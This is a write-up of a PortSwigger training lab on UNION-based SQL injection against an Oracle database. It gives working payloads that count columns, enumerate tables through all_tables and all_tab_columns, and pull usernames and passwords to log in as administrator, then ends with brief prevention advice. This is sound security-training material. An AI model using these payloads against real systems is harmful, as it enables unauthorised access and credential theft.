SQL Injection: Listing Database Contents (Oracle)

Category: SQL Injection
Difficulty: Practitioner
Lab Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

---

Vulnerability

The product category filter is vulnerable to SQL injection.
User input is inserted directly into the SQL query, allowing attackers to perform UNION-based SQL injection and retrieve data from other tables.

The goal of this lab is to identify the table containing user credentials and retrieve the administrator password.

---

Payloads

Retrieve table names:

' UNION SELECT table_name, NULL FROM all_tables--

Retrieve column names:

' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--

Retrieve usernames and passwords:

' UNION SELECT username, password FROM users--

---

Exploitation Steps

1. Navigate to a product category.

2. Determine the number of columns returned by the query:

' ORDER BY 1--
' ORDER BY 2--

The query returns 2 columns.

3. Retrieve all table names:

' UNION SELECT table_name, NULL FROM all_tables--

Identify the USERS table.

4. Retrieve column names from the USERS table:

' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--

Identify the columns USERNAME and PASSWORD.

5. Retrieve the credentials:

' UNION SELECT username, password FROM users--

6. Log in using:

username: administrator
password: <retrieved password>

This solves the lab.

---

Why the Attack Works

Oracle databases do not use "information_schema".
Instead, metadata about tables and columns is stored in system views such as:

all_tables
all_tab_columns

Attackers can query these views using UNION injection to discover database structure and retrieve sensitive data.

---

Prevention

- Use parameterized queries
- Avoid concatenating user input into SQL queries
- Implement strict input validation
